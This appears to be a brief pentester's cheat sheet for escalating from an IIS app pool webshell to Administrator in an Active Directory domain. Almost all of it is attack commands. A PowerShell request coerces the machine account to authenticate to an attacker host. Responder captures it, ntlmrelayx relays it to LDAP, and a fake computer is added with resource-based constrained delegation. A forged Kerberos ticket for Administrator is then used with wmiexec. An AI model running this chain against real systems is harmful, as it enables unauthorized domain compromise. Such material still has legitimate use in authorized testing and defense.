# Quickwin - IIS apppool account NTLM Relay to LDAP with RBCD

## Intro

Privilege escalation IIS apppool webshell to Admin

## HTTP coerce of the machine account

```shell
powershell -iwr http://<ip_attack> -UseDefaultCredentials
responder -I <interface> -v
```

### NTLM Relay to LDAP for RBCD (ou Shadow credentials)

```shell
ntlmrelayx -t ldap://<dc_ip> -smb2support --interactive
nc 127.0.0.1 11000
# start_tls
# add_computer fakePC P@ssword123
# set_rbcd <target_rbcd> fakePC$ 
```

### Profit :)

```shell
getsT.py -spn cifs/<target_rbcd>.example.com -impersonate Administrator -dc-ip <dc_ip/fqdn> 'example.com/fakePC$:P@ssword123'
export KRB5CCNAME=Administrator@cifs_<target_rbcd>.example.com.ccache
wmiexec.py -k -no-pass @<target_rbcd>.example.com
```

## Sources
- https://x.com/M4yFly/status/1745581076846690811


